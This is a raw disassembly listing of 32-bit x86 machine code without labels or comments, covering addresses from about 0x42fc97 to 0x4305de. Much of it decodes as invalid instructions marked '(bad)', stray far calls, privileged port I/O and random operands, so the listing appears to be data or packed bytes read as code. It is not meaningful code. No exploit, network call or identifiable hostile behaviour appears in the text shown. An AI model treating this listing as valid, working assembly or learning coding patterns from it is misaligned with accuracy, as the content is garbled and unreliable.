  42fc97:	(bad)  
  42fc9a:	(bad)  
  42fc9b:	js     0x42fc89
  42fc9d:	(bad)  
  42fc9e:	and    eax,0x52adcf
  42fca3:	daa    
  42fca4:	retf   
  42fca5:	pushf  
  42fca6:	or     ebx,DWORD PTR [edx+ebx*2-0x36]
  42fcaa:	dec    ebp
  42fcab:	daa    
  42fcac:	(bad)  
  42fcad:	jle    0x42fc5a
  42fcaf:	cmp    BYTE PTR [ebx],0x45
  42fcb2:	aad    0xd5
  42fcb4:	ja     0x42fc93
  42fcb6:	pusha  
  42fcb7:	addr16 pop ecx
  42fcb9:	cdq    
  42fcba:	xor    al,0xe3
  42fcbc:	push   ebx
  42fcbd:	movntps XMMWORD PTR [eax+0x191e3f3d],xmm2
  42fcc4:	fadd   DWORD PTR [edi]
  42fcc6:	jge    0x42fcb8
  42fcc8:	xor    eax,0xa0397890
  42fccd:	mov    al,fs:0x2424cf0e
  42fcd3:	dec    esi
  42fcd4:	adc    BYTE PTR [ecx+0xe9d1fc8],0xe6
  42fcdb:	(bad)  
  42fcdc:	or     eax,0x78e35ded
  42fce1:	jnp    0x42fd15
  42fce3:	ja     0x42fd20
  42fce5:	push   ecx
  42fce6:	sub    DWORD PTR [ecx+0x6b],esp
  42fce9:	xchg   edi,eax
  42fcea:	jp     0x42fcfa
  42fcec:	in     eax,dx
  42fced:	cmp    DWORD PTR [edx+0x26],esp
  42fcf0:	(bad)  
  42fcf1:	int    0x71
  42fcf3:	fdivp  st(7),st
  42fcf5:	fwait
  42fcf6:	sub    BYTE PTR [edi],0x72
  42fcf9:	loop   0x42fc95
  42fcfb:	mov    ?,WORD PTR [edi+ebp*8]
  42fcfe:	pusha  
  42fcff:	fstp   TBYTE PTR [esi+0x45260a5e]
  42fd05:	pop    edx
  42fd06:	inc    esi
  42fd07:	stos   DWORD PTR es:[edi],eax
  42fd08:	dec    esp
  42fd09:	xchg   ecx,eax
  42fd0a:	rol    BYTE PTR ds:0x8f1cd7c4,cl
  42fd10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd11:	xor    al,0xfd
  42fd13:	mov    cl,0xdd
  42fd15:	ficomp DWORD PTR [edi+eax*2-0x1e2a9844]
  42fd1c:	(bad)  
  42fd1d:	(bad)  
  42fd1e:	ja     0x42fd11
  42fd20:	fwait
  42fd21:	push   ecx
  42fd22:	push   esp
  42fd23:	pop    ebx
  42fd24:	cvtpi2ps xmm1,QWORD PTR [eax]
  42fd27:	fld    TBYTE PTR [eax+eax*4+0x168744e7]
  42fd2e:	mov    ds:0x47308489,al
  42fd33:	or     bh,BYTE PTR [edi]
  42fd35:	dec    BYTE PTR [ebp-0x12]
  42fd38:	xchg   ebx,eax
  42fd39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd3a:	lods   eax,DWORD PTR ds:[esi]
  42fd3b:	jg     0x42fd26
  42fd3d:	outs   dx,BYTE PTR ds:[esi]
  42fd3e:	data16 loope 0x42fdbf
  42fd41:	hlt    
  42fd42:	popa   
  42fd43:	sbb    ebp,DWORD PTR ds:0x5e15
  42fd48:	xor    ebx,DWORD PTR [eax+0x35a6ffcf]
  42fd4e:	jg     0x42fcd9
  42fd50:	jnp    0x42fd07
  42fd52:	(bad)
  42fd55:	push   edi
  42fd56:	fs mov ch,0x43
  42fd59:	leave  
  42fd5a:	neg    bh
  42fd5c:	mov    edx,0xe6d84514
  42fd61:	xchg   ebp,eax
  42fd62:	sub    esi,ebx
  42fd64:	repz mov ch,al
  42fd67:	stos   BYTE PTR es:[edi],al
  42fd68:	push   edi
  42fd69:	add    eax,0x7ec341b1
  42fd6e:	add    bh,dl
  42fd70:	xor    ebx,DWORD PTR [edx]
  42fd72:	test   eax,0x2a59cddc
  42fd77:	dec    esi
  42fd78:	test   bl,bl
  42fd7a:	cld    
  42fd7b:	push   esi
  42fd7c:	loop   0x42fd1f
  42fd7e:	mov    ebx,0xac486688
  42fd83:	inc    esi
  42fd84:	mov    bl,0x9f
  42fd86:	pop    esi
  42fd87:	cld    
  42fd88:	cli    
  42fd89:	in     eax,dx
  42fd8a:	sub    ah,cl
  42fd8c:	retf   
  42fd8d:	cmp    eax,0x5cdab6
	...
  42fdf2:	add    BYTE PTR [eax],al
  42fdf4:	dec    eax
  42fdf5:	rol    dl,0xf0
  42fdf8:	retf   0x7af2
  42fdfb:	clc    
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz dec ebx
  42fe01:	lds    esi,FWORD PTR [ecx+0x201ae80]
  42fe07:	add    BYTE PTR ds:0x21000001,al
  42fe0d:	xor    al,0x70
  42fe0f:	add    ebx,DWORD PTR [edx]
  42fe11:	retf   0x56c6
  42fe14:	mov    esp,0x87b811cd
  42fe19:	mov    dl,0xac
  42fe1b:	ja     0x42fdfd
  42fe1d:	mov    dl,0x8e
  42fe1f:	cmp    ecx,DWORD PTR [ebp-0xa]
  42fe22:	lahf   
  42fe23:	add    BYTE PTR [eax-0x625c7067],cl
  42fe29:	or     BYTE PTR [esi+0x17],0xe2
  42fe2d:	clc    
  42fe2e:	das    
  42fe2f:	scas   eax,DWORD PTR es:[edi]
  42fe30:	push   0xe573fee
  42fe35:	inc    edx
  42fe36:	sbb    ch,BYTE PTR ds:0x502504b8
  42fe3c:	inc    ebx
  42fe3d:	jle    0x42fdd0
  42fe3f:	add    BYTE PTR [eax+0x38],0x6
  42fe43:	push   edx
  42fe44:	jo     0x42fe22
  42fe46:	inc    esp
  42fe47:	jecxz  0x42fe6a
  42fe49:	inc    ebp
  42fe4a:	sub    DWORD PTR [ecx-0x5e23af94],eax
  42fe50:	(bad)  
  42fe53:	hlt    
  42fe54:	jne    0x42fe45
  42fe56:	int    0xd8
  42fe58:	sub    eax,edx
  42fe5a:	xchg   edi,eax
  42fe5b:	addr16 pusha 
  42fe5d:	or     eax,0xf318b38b
  42fe62:	rcr    BYTE PTR [ebx-0x65289eb],0xef
  42fe69:	neg    ch
  42fe6b:	out    dx,al
  42fe6c:	xchg   edi,eax
  42fe6d:	xor    al,0x20
  42fe6f:	ret    0xa1be
  42fe72:	xor    edx,edx
  42fe74:	rcl    ebx,0xf3
  42fe77:	call   0x511d:0xc394175e
  42fe7e:	or     BYTE PTR [eax+eax*8],bl
  42fe81:	pop    ecx
  42fe82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fe83:	cmp    DWORD PTR [ebx],esi
  42fe85:	(bad)  
  42fe86:	dec    ebp
  42fe87:	scas   al,BYTE PTR es:[edi]
  42fe88:	pop    edx
  42fe89:	pop    ss
  42fe8a:	dec    ebp
  42fe8b:	mov    esp,0xe547c69
  42fe90:	cli    
  42fe91:	adc    ecx,DWORD PTR [eax+0x16]
  42fe94:	push   es
  42fe95:	push   esi
  42fe96:	(bad)  
  42fe97:	sub    ah,ch
  42fe99:	bnd jp 0x42fe86
  42fe9c:	iret   
  42fe9d:	xchg   BYTE PTR [ebx-0x3ee81f85],bl
  42fea3:	jle    0x42ff00
  42fea5:	add    cl,BYTE PTR [eax-0x3739ef5f]
  42feab:	das    
  42feac:	sahf   
  42fead:	mov    al,0xce
  42feaf:	mov    ebx,DWORD PTR [ecx-0x60]
  42feb2:	or     ch,al
  42feb4:	push   ebx
  42feb5:	loope  0x42ff05
  42feb7:	in     al,dx
  42feb8:	inc    edx
  42feb9:	out    0x61,al
  42febb:	ds mov cl,0x25
  42febe:	(bad)  
  42febf:	ja     0x42ff3e
  42fec1:	gs mov edx,0x4da20585
  42fec7:	dec    eax
  42fec8:	cmp    al,0xd3
  42feca:	call   0x459ec794
  42fecf:	mov    al,ds:0x72bcb190
  42fed4:	outs   dx,BYTE PTR ds:[esi]
  42fed5:	mov    dh,0xde
  42fed7:	div    BYTE PTR [edx+0x6e]
  42feda:	int    0xba
  42fedc:	xchg   esp,eax
  42fedd:	adc    eax,0x73ed2366
  42fee2:	lods   eax,DWORD PTR ds:[esi]
  42fee3:	rcr    DWORD PTR [ebx],1
  42fee5:	bound  eax,QWORD PTR [edx]
  42fee7:	sub    DWORD PTR [eax-0x29],ebp
  42feea:	sub    bl,ah
  42feec:	hlt    
  42feed:	(bad)  
  42feee:	pusha  
  42feef:	scas   eax,DWORD PTR es:[edi]
  42fef0:	ja     0x42ff35
  42fef2:	jl     0x42fee2
  42fef4:	cmp    DWORD PTR [edi-0x57],edx
  42fef7:	xlat   BYTE PTR ds:[ebx]
  42fef9:	xor    DWORD PTR [esi],edx
  42fefb:	outs   dx,DWORD PTR ds:[esi]
  42fefc:	pop    esp
  42fefd:	jcxz   0x42fed7
  42ff00:	test   eax,0x80a66350
  42ff05:	test   DWORD PTR [esi-0xe],ebp
  42ff08:	vorps  ymm4,ymm2,YMMWORD PTR [ebp-0x5697e8e3]
  42ff10:	xchg   ebx,eax
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [ecx+esi*4-0x58],0xea
  42ff83:	shl    DWORD PTR [ebx+0x5000202],0x1
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	xor    al,0xe0
  42ff8e:	mov    ebp,0xfe525ee8
  42ff93:	dec    esp
  42ff94:	sub    DWORD PTR [eax+0x13],eax
  42ff97:	inc    edx
  42ff98:	pop    esi
  42ff99:	stos   BYTE PTR es:[edi],al
  42ff9a:	nop
  42ff9b:	call   0x9e90f485
  42ffa0:	(bad)  [ecx+0x52]
  42ffa3:	clc    
  42ffa4:	push   ebp
  42ffa5:	jns    0x42ff70
  42ffa7:	jecxz  0x43001d
  42ffa9:	or     al,0x8d
  42ffab:	sub    DWORD PTR [ebx],0x3590ff46
  42ffb1:	es in  al,0xc3
  42ffb4:	inc    ecx
  42ffb5:	xchg   BYTE PTR [edi],ch
  42ffb7:	(bad)  
  42ffb8:	ins    BYTE PTR es:[edi],dx
  42ffb9:	mov    ?,WORD PTR [esi+ecx*8-0x49]
  42ffbd:	pop    ebp
  42ffbe:	cmp    eax,0x282e5ef
  42ffc3:	cmp    BYTE PTR [ecx],dh
  42ffc5:	(bad)
  42ffc8:	jle    0x430038
  42ffca:	push   0x3f
  42ffcc:	retf   
  42ffcd:	or     cl,BYTE PTR [eax+0x2835890e]
  42ffd3:	inc    esi
  42ffd4:	fadd   QWORD PTR cs:[di-0x4d]
  42ffd9:	loopne 0x430019
  42ffdb:	loopne 0x42ffee
  42ffdd:	repz xor al,0x55
  42ffe0:	add    ch,dl
  42ffe2:	mov    ebx,eax
  42ffe4:	aam    0xaf
  42ffe6:	cmp    bl,BYTE PTR [eax-0x79]
  42ffe9:	call   0x2621:0xe5a1aa04
  42fff0:	push   es
  42fff1:	jo     0x430007
  42fff3:	ds push 0xffffffe9
  42fff6:	xchg   ecx,eax
  42fff7:	add    al,0xb5
  42fff9:	push   ds
  42fffa:	add    edi,DWORD PTR [ebx-0x65969ee8]
  430000:	test   al,0x6c
  430002:	push   es
  430003:	call   0x1a08:0xb6679d8f
  43000a:	dec    esp
  43000b:	xchg   edi,eax
  43000c:	pop    ebx
  43000d:	sub    eax,0xf8393820
  430012:	scas   eax,DWORD PTR es:[edi]
  430013:	lods   eax,DWORD PTR ds:[esi]
  430014:	or     ah,ah
  430016:	lea    eax,[edi+0x787aeabc]
  43001c:	addr16 das 
  43001e:	scas   eax,DWORD PTR es:[edi]
  43001f:	sahf   
  430020:	or     BYTE PTR [ecx-0x6221638e],0x8e
  430027:	pop    ebx
  430028:	lods   al,BYTE PTR ds:[esi]
  430029:	les    ecx,FWORD PTR [ecx]
  43002b:	pop    ds
  43002c:	pop    ebx
  43002d:	imul   edi,DWORD PTR [esi-0x3d9ea633],0x16
  430034:	adc    DWORD PTR [ebp+0x71e234f1],0xf1c33b9c
  43003e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43003f:	scas   al,BYTE PTR es:[edi]
  430040:	or     bh,BYTE PTR [edx-0x73]
  430043:	loope  0x430083
  430045:	nop
  430046:	cwde   
  430047:	jge    0x43006a
  430049:	inc    eax
  43004a:	leave  
  43004b:	ror    DWORD PTR [ecx+0x32e6f051],0xbd
  430052:	adc    eax,0x38e971c7
  430057:	add    DWORD PTR [edi+eiz*1+0x1b],0xc07a2f52
  43005f:	sub    eax,0xb25595da
  430064:	(bad)  
  430065:	and    DWORD PTR [edi],ecx
  430067:	icebp  
  430068:	sub    BYTE PTR [ecx-0x69839d99],dh
  43006e:	jecxz  0x430074
  430070:	pop    edi
  430071:	push   edx
  430072:	dec    edi
  430073:	push   esi
  430074:	jae    0x43005e
  430076:	lods   eax,DWORD PTR ds:[esi]
  430077:	jns    0x430069
  430079:	test   eax,0xed0d2324
  43007e:	mov    dh,0x8a
  430080:	ds push esp
  430082:	dec    cx
  430084:	imul   eax,DWORD PTR [edx+ebx*8-0x57],0x15142c4
  43008c:	mov    ch,0x8a
  43008e:	loopne 0x430090
  430090:	sbb    DWORD PTR [eax],eax
	...
  4300f2:	add    BYTE PTR [eax],al
  4300f4:	(bad)  
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0xb7
  430101:	and    al,0xad
  430103:	jmp    0x21:0x203b8
  43010a:	add    BYTE PTR [eax],al
  43010c:	cmp    DWORD PTR [edi+edi*4+0x259e0113],eax
  430113:	gs aas 
  430115:	pop    ebp
  430116:	lds    edx,FWORD PTR [esi+0x7c]
  430119:	dec    ebp
  43011a:	call   0xa7d9:0x7d5dd4cc
  430121:	cmp    eax,0x21f1b4b3
  430126:	fnsave [edx+0x7e]
  430129:	add    eax,0xf4cc92
	...
  430172:	add    BYTE PTR [eax],al
  430174:	dec    ebp
  430175:	push   ebp
  430176:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43017c:	mov    esp,ebp
  43017e:	or     ah,dh
  430180:	dec    ebp
  430181:	add    bh,al
  430183:	add    BYTE PTR [eax],cl
  430185:	add    BYTE PTR [eax],al
  430187:	mov    DWORD PTR [eax],0x40f44545
  43018d:	xor    DWORD PTR [eax],eax
  43018f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430195:	(bad)  
  430196:	enter  0x4d45,0xbc
  43019a:	mov    esi,DWORD PTR [edx]
  43019c:	hlt    
  43019d:	test   ebx,ecx
  43019f:	pushf  
  4301a0:	enter  0x4df8,0x8b
  4301a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4301ab:	inc    ebp
  4301ac:	mov    ebp,0xff8bfffc
  4301b1:	dec    ebp
  4301b2:	mov    ch,0xf4
  4301b4:	call   DWORD PTR [ebx-0x1]
  4301b7:	mov    ebx,0x8005474
  4301bc:	call   DWORD PTR [ecx+0x8]
  4301bf:	pop    es
  4301c0:	jmp    0xb8:0xacb4533
  4301c7:	fwait
  4301c8:	mov    esi,DWORD PTR [edx-0xc]
  4301cb:	xor    cl,bl
  4301cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4301d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4301d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4301df:	xor    eax,DWORD PTR [eax]
  4301e1:	retf   
  4301e2:	retf   
  4301e3:	add    ecx,eax
  4301e5:	enter  0x894d,0x64
  4301e9:	dec    ebp
  4301ea:	sbb    ah,cl
  4301ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4301f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4301f8:	test   DWORD PTR [ebx],esi
  4301fa:	dec    ebx
  4301fc:	inc    DWORD PTR [ebx]
  4301fe:	inc    eax
  4301ff:	enter  0x8989,0x50
  430203:	(bad)  
  430204:	call   DWORD PTR [ebx+ecx*4-0x1]
  430208:	cld    
  430209:	dec    DWORD PTR [ebp-0xa90001]
  43020f:	push   edi
  430210:	mov    BYTE PTR [edx+0x1],ch
  430213:	and    al,BYTE PTR [eax]
  430215:	pop    ecx
  430216:	inc    ebp
  430217:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43021d:	push   0xffffff89
  43021f:	pop    ecx
  430220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430221:	dec    ebp
  430222:	add    BYTE PTR [ecx+0x45fc088b],cl
  430228:	jne    0x430274
  43022a:	lea    eax,[eax]
  43022c:	push   eax
  43022d:	(bad)  
  43022e:	dec    DWORD PTR [eax]
  430230:	mov    DWORD PTR [eax],eax
  430232:	test   al,0x0
  430234:	add    BYTE PTR [ebp-0x18],cl
  430237:	xor    ebp,DWORD PTR [ebx]
  430239:	add    eax,DWORD PTR [eax]
  43023b:	mov    eax,eax
  43023d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430244:	inc    ebp
  430245:	mov    DWORD PTR [ebx+0x459408],ecx
  43024b:	arpl   WORD PTR [ebx-0x372749b],cx
  430251:	sub    al,0x80
  430253:	inc    DWORD PTR [ecx]
  430255:	lea    eax,[eax]
  430257:	or     al,0x0
  430259:	inc    DWORD PTR [ecx-0x18]
  43025c:	mov    ecx,DWORD PTR [ebx]
  43025e:	cld    
  43025f:	add    BYTE PTR [ecx+0x75014d],cl
  430265:	(bad)  
  430266:	xchg   ebp,eax
  430267:	fdivr  st,st(7)
  430269:	inc    eax
  43026a:	inc    DWORD PTR [eax]
  43026c:	mov    ecx,DWORD PTR [ebp-0x4]
  43026f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430275:	add    BYTE PTR [edx],dl
  430277:	enter  0x4d90,0x0
  43027b:	mov    eax,DWORD PTR [eax]
  43027d:	hlt    
  43027e:	add    al,0xa5
  430280:	mov    al,0xff
  430282:	add    bh,bh
  430284:	add    BYTE PTR [ebx],dh
  430286:	inc    DWORD PTR [ebx]
  430288:	sbb    al,0x89
  43028a:	jne    0x430268
  43028c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430292:	mov    eax,DWORD PTR [ebp-0xff0048]
  430298:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43029f:	inc    DWORD PTR [ebp-0x75]
  4302a2:	fisttp QWORD PTR [esi+ebp*8]
  4302a5:	test   DWORD PTR [esi-0x1],esp
  4302a8:	inc    ebp
  4302a9:	(bad)  
  4302aa:	aas    
  4302ab:	inc    ebp
  4302ac:	(bad)  
  4302ad:	lea    edi,[esp+eiz*2-0x1]
  4302b1:	inc    edi
  4302b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4302b9:	mov    ebp,esp
  4302bb:	cld    
  4302bc:	loop   0x43024b
  4302be:	inc    ebp
  4302bf:	(bad)  
  4302c0:	out    dx,al
  4302c1:	(bad)  
  4302c2:	fisttp WORD PTR [eax+0x8801c7]
  4302c8:	jecxz  0x43030f
  4302ca:	in     al,dx
  4302cb:	inc    DWORD PTR [ebp-0x4]
  4302ce:	out    0x8d,eax
  4302d0:	aas    
  4302d1:	inc    edi
  4302d3:	jmp    FWORD PTR [eax-0x78]
  4302d6:	inc    DWORD PTR [ecx]
  4302d8:	mov    DWORD PTR [eax],0xc7043d
  4302de:	ins    BYTE PTR es:[edi],dx
  4302df:	test   edi,edi
  4302e1:	pandn  mm0,mm5
  4302e4:	aas    
  4302e5:	add    bh,al
  4302e7:	mov    esi,DWORD PTR [eax-0x4]
  4302ea:	inc    DWORD PTR [eax+0xdf01ee]
  4302f0:	(bad)  
  4302f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4302f5:	mov    ebp,ebx
  4302f7:	xchg   esp,eax
  4302f8:	fild   DWORD PTR [eax]
  4302fa:	(bad)  
  4302fb:	mov    edi,DWORD PTR [eax+0x3]
  4302fe:	(bad)  
  4302ff:	cmp    al,0xe7
  430301:	dec    ebp
  430302:	leave  
  430303:	mov    ebp,eax
  430305:	fsubr  DWORD PTR [edx]
  430307:	add    BYTE PTR [eax],al
  430309:	lea    ecx,[ebx-0x7f0003b4]
  43030f:	push   edx
  430310:	add    DWORD PTR [ebp+0x0],edx
  430313:	mov    esi,DWORD PTR [eax]
  430315:	mov    WORD PTR [edi],ss
  430317:	add    BYTE PTR [eax],al
  430319:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43031f:	add    ah,bh
  430321:	push   0x7d
  430323:	dec    DWORD PTR [ebx+0xd88c]
  430329:	push   edx
  43032a:	mov    edx,DWORD PTR [ecx-0x4]
  43032d:	call   DWORD PTR [eax+0x7d01fc]
  430333:	mov    esi,DWORD PTR [esi]
  430335:	cld    
  430336:	add    BYTE PTR [eax+0x560150],dl
  43033c:	test   DWORD PTR [ebp+0x75],eax
  43033f:	loop   0x4302cc
  430341:	jmp    0xe38b:0x947dc7fc
  430348:	fsub   st,st(7)
  43034a:	add    bh,al
  43034c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430352:	add    edi,edi
  430354:	add    bh,bh
  430356:	adc    al,0xed
  430358:	add    dh,ah
  43035a:	push   eax
  43035b:	inc    ebp
  43035c:	push   esi
  43035d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430363:	test   BYTE PTR [ebx],dh
  430365:	out    0x5,al
  430367:	shl    BYTE PTR [edx+0x45],0x0
  43036b:	jmp    0x43032e
  43036d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430374:	inc    esi
  430375:	jle    0x430377
  430377:	test   edi,eax
  430379:	(bad)  
  43037a:	call   0x130047e
  43037f:	out    0x75,al
  430381:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430387:	in     al,dx
  430388:	mov    esp,edx
  43038a:	mov    ah,0x85
  43038c:	add    bh,bh
  43038e:	call   0x1292d92
  430393:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43039a:	add    ebx,esp
  43039c:	add    ah,ch
  43039e:	xor    BYTE PTR [ebp-0xff0073],al
  4303a4:	mov    ebx,ebp
  4303a6:	cld    
  4303a7:	jle    0x430332
  4303a9:	add    DWORD PTR gs:[eax],eax
  4303ac:	add    BYTE PTR [eax+0x1],dl
  4303af:	inc    ebp
  4303b0:	inc    ebp
  4303b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4303b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4303bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4303c3:	inc    ebp
  4303c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4303ca:	inc    ebp
  4303cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4303d1:	mov    edi,edi
  4303d3:	mov    eax,0xe80800ff
  4303d8:	inc    ebp
  4303d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4303df:	add    al,0x1
  4303e1:	rol    BYTE PTR [eax],0x1e
  4303e4:	jne    0x43042b
  4303e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4303ec:	inc    DWORD PTR [ecx]
  4303ee:	call   0x882cf3
  4303f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4303f9:	call   0x432dff
  4303fe:	xor    bh,bh
  430400:	push   edi
  430401:	adc    BYTE PTR [ebx-0x74741bbb],al
  430407:	fsub   st,st(4)
  430409:	ret    
  43040a:	loopne 0x4303a7
  43040c:	xor    DWORD PTR [edx],0x31
  43040f:	cmp    edi,edi
  430411:	bswap  eax
  430413:	rol    BYTE PTR gs:[eax],0x5
  430417:	jmp    0x12e0561
  43041c:	mov    eax,DWORD PTR [ebp-0x4]
  43041f:	add    BYTE PTR [eax+0xff0100],bh
  430425:	cld    
  430426:	jne    0x4304a5
  430428:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43042e:	jb     0x430431
  430430:	add    BYTE PTR [eax],al
  430432:	push   eax
  430433:	fild   DWORD PTR [ebp+0x0]
  430436:	mov    edx,DWORD PTR [eax-0x68]
  430439:	inc    ebp
  43043a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430440:	or     bh,bh
  430442:	inc    ebp
  430443:	call   0x1272b47
  430448:	jge    0x430497
  43044a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430450:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430456:	fwait
  430457:	mov    eax,0x30132
  43045c:	lea    esi,[ebp+0x2c]
  43045f:	xor    edi,edi
  430461:	(bad)  
  430462:	call   0x1422dcf
  430467:	call   0x1372df7
  43046c:	jne    0x4303f9
  43046e:	xor    edi,esp
  430470:	add    eax,DWORD PTR [eax+0xc018d]
  430476:	push   DWORD PTR [eax]
  430478:	call   0xcc2dd4
  43047d:	enter  0x45ff,0xe0
  430481:	mov    ecx,DWORD PTR [ebp-0x28]
  430484:	xor    eax,DWORD PTR [eax]
  430486:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43048c:	(bad)  
  43048d:	xchg   ebp,eax
  43048e:	call   0x1420592
  430493:	mov    cl,0x45
  430495:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43049b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4304a2:	mov    edi,edi
  4304a4:	or     BYTE PTR [eax],cl
  4304a6:	inc    ebp
  4304a7:	test   DWORD PTR gs:[eax],eax
  4304aa:	je     0x4304f1
  4304ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4304b2:	xor    edx,DWORD PTR [eax-0x73]
  4304b5:	push   ebp
  4304b6:	or     BYTE PTR [ebp+0x21007572],al
  4304bc:	inc    ebp
  4304bd:	loopne 0x43044a
  4304bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4304c6:	int    0x0
  4304c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4304ce:	inc    ebp
  4304cf:	push   ebp
  4304d0:	cmp    ebp,eax
  4304d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4304d9:	cld    
  4304da:	fadd   QWORD PTR [eax+0x3b014d]
  4304e0:	jne    0x430512
  4304e2:	push   0xf8898557
  4304e7:	loopne 0x43055e
  4304e9:	inc    ebp
  4304ea:	lea    eax,[ebx+0x72e8e4cc]
  4304f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4304f6:	jmp    0x43052b
  4304f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4304fe:	xor    eax,edi
  430500:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43050a:	rcl    BYTE PTR [eax-0x40],1
  43050d:	inc    ebp
  43050e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430516:	inc    ebp
  430517:	xchg   ebp,eax
  430518:	ud0    ebp,DWORD PTR [ebx]
  43051b:	inc    DWORD PTR [eax]
  43051d:	daa    
  43051e:	jbe    0x430520
  430520:	mov    dl,BYTE PTR [eax-0x80]
  430523:	push   ebp
  430524:	pop    ds
  430525:	mov    ecx,DWORD PTR [esp+esi*8]
  430528:	inc    eax
  430529:	retf   
  43052a:	inc    ebp
  43052b:	iret   
  43052c:	jb     0x4304f6
  43052e:	mov    eax,DWORD PTR [edi]
  430530:	int3   
  430531:	inc    ebp
  430532:	inc    ebp
  430533:	add    DWORD PTR [ecx],esi
  430535:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43053c:	xor    dh,BYTE PTR [ebx]
  43053e:	pushf  
  43053f:	lea    ecx,[ecx+0x4d72d808]
  430545:	add    BYTE PTR [ebx],dh
  430547:	inc    ebp
  430548:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43054e:	xor    dl,BYTE PTR [edx]
  430550:	add    eax,DWORD PTR [ebp-0x77]
  430553:	mov    eax,esp
  430555:	fmul   QWORD PTR [ebp-0x3d]
  430558:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43055f:	mov    DWORD PTR [ebp-0x24],eax
  430562:	rol    DWORD PTR [ebp-0x64],1
  430565:	xor    eax,edi
  430567:	mov    ecx,0xff858db0
  43056c:	clc    
  43056d:	enter  0x4d45,0x3c
  430571:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430578:	test   esi,edi
  43057a:	clc    
  43057b:	inc    DWORD PTR [ebp+0x45]
  43057e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430586:	test   DWORD PTR [ecx],esi
  430588:	clc    
  430589:	pushf  
  43058a:	inc    ebp
  43058b:	(bad)  
  43058c:	cmp    ah,bh
  43058e:	pushf  
  43058f:	inc    ebp
  430590:	mov    edx,DWORD PTR [eax-0x24]
  430593:	add    BYTE PTR [ebp+0x0],dl
  430596:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43059c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4305a0:	add    al,dl
  4305a2:	jmp    0x1040772
  4305a7:	jb     0x4305f6
  4305a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4305af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4305b2:	xor    ecx,DWORD PTR [edi]
  4305b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4305b8:	(bad)  
  4305ba:	clc    
  4305bb:	int3   
  4305bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4305c3:	push   cs
  4305c4:	xor    ecx,eax
  4305c6:	xor    esp,ecx
  4305c8:	add    ebp,DWORD PTR [eax]
  4305ca:	add    esi,DWORD PTR [eax]
  4305cc:	(bad)  
  4305ce:	retf   0x55cc
  4305d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4305d5:	(bad)  
  4305d6:	cli    
  4305d7:	fdiv   st(1),st
  4305d9:	test   DWORD PTR [eax+edi*8],ecx
  4305dc:	dec    ebp
  4305dd:	inc    ebp
  4305de:	xor    edi,DWORD PTR [eax-0x7167afd]
